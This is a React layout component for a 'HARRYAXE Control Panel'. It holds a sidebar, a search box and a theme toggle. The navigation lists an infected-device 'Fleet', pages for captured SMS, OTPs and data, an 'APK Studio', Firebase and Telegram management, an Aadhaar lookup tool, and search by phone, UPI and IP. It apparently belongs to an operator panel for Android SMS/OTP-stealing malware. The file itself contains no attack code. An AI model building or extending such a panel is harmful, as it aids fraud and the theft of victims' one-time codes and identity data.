import React, { useEffect, useState } from "react";
import { useAuth } from "@/lib/auth";
import { useLocation, Link } from "wouter";
import { useSearch } from "@/lib/search";
import {
  LogOut,
  Zap,
  Search,
  Sun,
  Moon,
  ChevronsLeft,
  ChevronsRight,
} from "lucide-react";

const THEME_KEY = "harryaxe-theme";

function getInitialTheme(): "dark" | "light" {
  try {
    const saved = localStorage.getItem(THEME_KEY);
    if (saved === "light" || saved === "dark") return saved;
  } catch {
    /* ignore */
  }
  return "dark"; // dark cyber is the default look
}

interface NavItem {
  href: string;
  label: string;
  fa: string; // FontAwesome class, e.g. "fa-microchip"
  adminOnly: boolean;
}

const navGroups: { label: string; links: NavItem[] }[] = [
  {
    label: "Fleet",
    links: [
      {
        href: "/dashboard",
        label: "Devices",
        fa: "fa-microchip",
        adminOnly: false,
      },
      { href: "/all-sms", label: "SMS", fa: "fa-envelope", adminOnly: false },
      { href: "/otps", label: "OTP", fa: "fa-key", adminOnly: false },
      { href: "/data", label: "Data", fa: "fa-database", adminOnly: false },
    ],
  },
  {
    label: "Management",
    links: [
      {
        href: "/subscriptions",
        label: "Users",
        fa: "fa-user-group",
        adminOnly: true,
      },
      {
        href: "/telegram",
        label: "Telegram",
        fa: "fa-paper-plane",
        adminOnly: false,
      },
      {
        href: "/apk-studio",
        label: "APK Studio",
        fa: "fa-box-open",
        adminOnly: false,
      },
      {
        href: "/firebases",
        label: "Firebases",
        fa: "fa-fire",
        adminOnly: true,
      },
    ],
  },
  {
    label: "Tools",
    links: [
      {
        href: "/user-search",
        label: "Search",
        fa: "fa-magnifying-glass",
        adminOnly: false,
      },
      { href: "/tool", label: "Aadhaar", fa: "fa-id-card", adminOnly: false },
      { href: "/pam", label: "PAM", fa: "fa-robot", adminOnly: false },
      { href: "/profile", label: "Profile", fa: "fa-gear", adminOnly: false },
    ],
  },
];

export function Layout({ children }: { children: React.ReactNode }) {
  const { logout, isAdmin, username } = useAuth();
  const [location, setLocation] = useLocation();
  const [theme, setTheme] = useState<"dark" | "light">(getInitialTheme);
  const [collapsed, setCollapsed] = useState(false);
  const { query, setQuery, searchRef, focusSearch } = useSearch();

  useEffect(() => {
    document.documentElement.classList.toggle("dark", theme === "dark");
    try {
      localStorage.setItem(THEME_KEY, theme);
    } catch {
      /* ignore */
    }
  }, [theme]);

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
        e.preventDefault();
        focusSearch();
      }
      if (e.key === "Escape") setCollapsed(false);
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, []);

  const handleLogout = () => {
    logout();
    setLocation("/");
  };

  const visibleGroups = navGroups
    .map((g) => ({
      ...g,
      links: g.links.filter((l) => !l.adminOnly || isAdmin),
    }))
    .filter((g) => g.links.length > 0);

  const visibleLinks = visibleGroups.flatMap((g) => g.links);

  const isActive = (href: string) =>
    location === href || location.startsWith(href + "/");

  const ThemeButton = ({ className = "" }: { className?: string }) => (
    <button
      onClick={() => setTheme((t) => (t === "dark" ? "light" : "dark"))}
      aria-label="Toggle theme"
      title={theme === "dark" ? "Switch to light mode" : "Switch to dark mode"}
      className={`flex items-center justify-center w-9 h-9 rounded-full text-muted-foreground hover:text-foreground hover:bg-muted transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:ring-offset-background ${className}`}
    >
      {theme === "dark" ? (
        <Sun className="w-[18px] h-[18px]" />
      ) : (
        <Moon className="w-[18px] h-[18px]" />
      )}
    </button>
  );

  const SearchBox = () => (
    <div className="relative w-full">
      <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
      <input
        ref={searchRef}
        data-search
        type="text"
        value={query}
        onChange={(e) => setQuery(e.target.value)}
        placeholder="Search phone, model, UPI, IP…"
        aria-label="Global search"
        className="w-full bg-card/70 border border-card-border rounded-xl py-2 pl-9 pr-14 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-accent/40 focus:border-accent/60 transition-all"
      />
      <kbd className="absolute right-3 top-1/2 -translate-y-1/2 hidden sm:inline-flex items-center px-1.5 py-0.5 rounded-md bg-muted border border-card-border text-[10px] font-mono text-muted-foreground">
        Ctrl K
      </kbd>
    </div>
  );

  const UserChip = ({ showLabel = true }: { showLabel?: boolean }) => (
    <div className="flex items-center gap-2 text-xs font-medium text-muted-foreground">
      <span className="w-6 h-6 rounded-full bg-gradient-to-br from-primary to-accent text-white flex items-center justify-center text-[10px] font-bold uppercase shrink-0">
        {(username || "U").slice(0, 1)}
      </span>
      {showLabel && (
        <span className="truncate">
          {isAdmin ? "Admin" : username || "User"}
        </span>
      )}
    </div>
  );

  return (
    <div className="min-h-dvh bg-background text-foreground font-sans md:flex">
      {/* ── Desktop sidebar (collapsible to 64px icons-only) ── */}
      <aside
        className={`hidden md:flex flex-col sticky top-0 h-dvh bg-card border-r border-card-border transition-[width] duration-200 shrink-0 ${
          collapsed ? "w-16" : "w-60"
        }`}
      >
        <div
          className={`flex items-center ${collapsed ? "justify-center" : "justify-between"} px-3 py-5 mb-4`}
        >
          <Link
            href="/dashboard"
            title="HARRYAXE"
            className={`flex items-center gap-3 min-w-0 ${collapsed ? "justify-center w-full" : "px-1"}`}
          >
            <span className="brand-mark w-9 h-9 rounded-xl shrink-0 shadow-sm shadow-primary/30">
              <Zap className="w-4 h-4" />
            </span>
            {!collapsed && (
              <span className="flex flex-col leading-tight min-w-0">
                <span className="font-display font-bold text-lg tracking-tight brand-gradient truncate">
                  HARRYAXE
                </span>
                <span className="page-eyebrow">Control Panel</span>
              </span>
            )}
          </Link>
          {!collapsed && (
            <button
              onClick={() => setCollapsed(true)}
              aria-label="Collapse sidebar"
              className="flex items-center justify-center w-8 h-8 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors shrink-0"
            >
              <ChevronsLeft className="w-4 h-4" />
            </button>
          )}
        </div>

        {collapsed && (
          <button
            onClick={() => setCollapsed(false)}
            aria-label="Expand sidebar"
            className="mx-2 mb-2 flex items-center justify-center w-8 h-8 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors self-center"
          >
            <ChevronsRight className="w-4 h-4" />
          </button>
        )}

        <nav className="flex-1 overflow-y-auto overflow-x-hidden px-2">
          {visibleGroups.map((group) => (
            <div key={group.label} className="mb-4">
              {!collapsed && (
                <p className="px-2 pb-1.5 text-[10px] font-bold uppercase tracking-widest text-muted-foreground/60">
                  {group.label}
                </p>
              )}
              <div className="space-y-1">
                {group.links.map(({ href, label, fa }) => {
                  const active = isActive(href);
                  return (
                    <Link
                      key={href}
                      href={href}
                      title={collapsed ? label : undefined}
                      aria-current={active ? "page" : undefined}
                      className={`nav-chip focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring ${collapsed ? "justify-center px-0" : "px-3"} py-2.5 ${active ? "nav-chip-active" : "nav-chip-idle hover:bg-muted"}`}
                    >
                      <i
                        className={`fa-solid ${fa} fa-fw ${collapsed ? "text-base" : "text-[15px]"}`}
                      />
                      {!collapsed && <span>{label}</span>}
                    </Link>
                  );
                })}
              </div>
            </div>
          ))}
        </nav>

        <div className="mt-4 pt-4 border-t border-card-border space-y-1 px-2">
          <div
            className={`flex items-center gap-2 py-2 text-xs font-medium text-muted-foreground ${
              collapsed ? "justify-center" : "px-2"
            }`}
          >
            <UserChip showLabel={!collapsed} />
            {!collapsed && (
              <span className="ml-auto">
                <ThemeButton />
              </span>
            )}
          </div>
          <button
            onClick={handleLogout}
            title={collapsed ? "Logout" : undefined}
            aria-label="Logout"
            className={`nav-chip w-full focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring ${collapsed ? "justify-center px-0" : "px-3"} py-2.5 nav-chip-idle hover:text-destructive hover:bg-destructive/10`}
          >
            <LogOut className="w-[18px] h-[18px]" />
            {!collapsed && <span>Logout</span>}
          </button>
        </div>
      </aside>

      {/* ── Right column: header(s) + content ── */}
      <div className="flex-1 min-w-0 flex flex-col">
        {/* Desktop top header with global search */}
        <header className="hidden md:flex sticky top-0 z-30 glass-card border-b border-card-border items-center gap-4 px-6 h-16">
          <div className="w-full max-w-md flex-1">
            <SearchBox />
          </div>
          <div className="ml-auto flex items-center gap-3">
            <UserChip />
            <ThemeButton />
          </div>
        </header>

        {/* Mobile top bar + search */}
        <header className="md:hidden sticky top-0 z-30 glass-card border-b border-card-border">
          <div className="flex items-center justify-between px-4 h-14">
            <Link href="/dashboard" className="flex items-center gap-2">
              <span className="brand-mark w-8 h-8 rounded-lg shadow-sm shadow-primary/30">
                <Zap className="w-4 h-4" />
              </span>
              <span className="flex flex-col leading-tight">
                <span className="font-display font-bold text-base tracking-tight brand-gradient">
                  HARRYAXE
                </span>
                <span className="page-eyebrow" style={{ fontSize: 9 }}>
                  Control Panel
                </span>
              </span>
            </Link>
            <ThemeButton />
          </div>
          <div className="px-4 pb-3">
            <SearchBox />
          </div>
          {/* Mobile nav bar (top, was bottom) */}
          <nav
            aria-label="Primary"
            className="hide-scrollbar flex items-stretch gap-0.5 overflow-x-auto border-t border-card-border px-1"
          >
            {visibleLinks.map(({ href, label, fa }) => {
              const active = isActive(href);
              return (
                <Link
                  key={href}
                  href={href}
                  aria-current={active ? "page" : undefined}
                  className={`flex min-w-[56px] flex-1 shrink-0 flex-col items-center justify-center gap-0.5 rounded-lg py-2 text-[9px] font-medium transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring ${
                    active ? "text-accent" : "text-muted-foreground"
                  }`}
                >
                  <i className={`fa-solid ${fa} fa-fw text-[15px]`} />
                  <span className="truncate w-full text-center">{label}</span>
                </Link>
              );
            })}
            <button
              onClick={handleLogout}
              aria-label="Logout"
              className="flex min-w-[56px] flex-shrink-0 flex-col items-center justify-center gap-0.5 rounded-lg px-2 py-2 text-[9px] font-medium text-muted-foreground transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
            >
              <LogOut className="w-[15px] h-[15px]" />
              <span>Logout</span>
            </button>
          </nav>
        </header>

        {/* Page content */}
        <main className="flex-1 min-w-0 overflow-x-hidden px-4 md:px-8 py-5 pb-5 md:py-8 md:pb-8">
          <div className="max-w-7xl mx-auto">{children}</div>
        </main>
      </div>
    </div>
  );
}
